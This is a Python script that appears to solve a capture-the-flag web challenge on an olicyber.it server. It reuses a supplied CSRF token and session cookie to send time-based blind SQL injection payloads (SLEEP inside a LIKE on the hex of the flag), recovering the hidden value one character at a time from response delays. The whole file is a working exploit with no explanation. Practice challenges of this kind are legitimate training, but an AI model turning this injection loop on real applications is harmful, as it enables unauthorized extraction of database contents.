import requests as r
from colorama import Fore
from time import time

url = "http://web-17.challs.olicyber.it/api/time"

def main():
    csrftoken = input("[" + Fore.BLUE + "+" + Fore.RESET + "]" + Fore.GREEN + " Enter the X-Csrftoken: " + Fore.YELLOW)
    
    headers = {'X-Csrftoken': csrftoken}
    
    session = input(Fore.RESET + "[" + Fore.BLUE + "+" + Fore.RESET + "]" + Fore.GREEN + " Enter the session cookie: " + Fore.YELLOW)
    
    print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " searching the flag..." + Fore.RESET)
    s = r.Session()
    s.cookies.set('session', session)
    dictionary = '0123456789abcdef'
    result = ''
    while True:
        for i in dictionary:
            start = time()
            question = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+i}%')='1"
            response = s.post(url, json={'query': question}, headers=headers).json()['result']
            elapsed = time() - start
            if elapsed > 1:
                result += i
                break
        else:
            break
    print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " Flag found!" + Fore.RESET)
    flag = str(bytes.fromhex(result).decode('utf-8'))
    print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " Flag: " + Fore.YELLOW + flag + Fore.RESET)

if __name__ == "__main__":
    main()
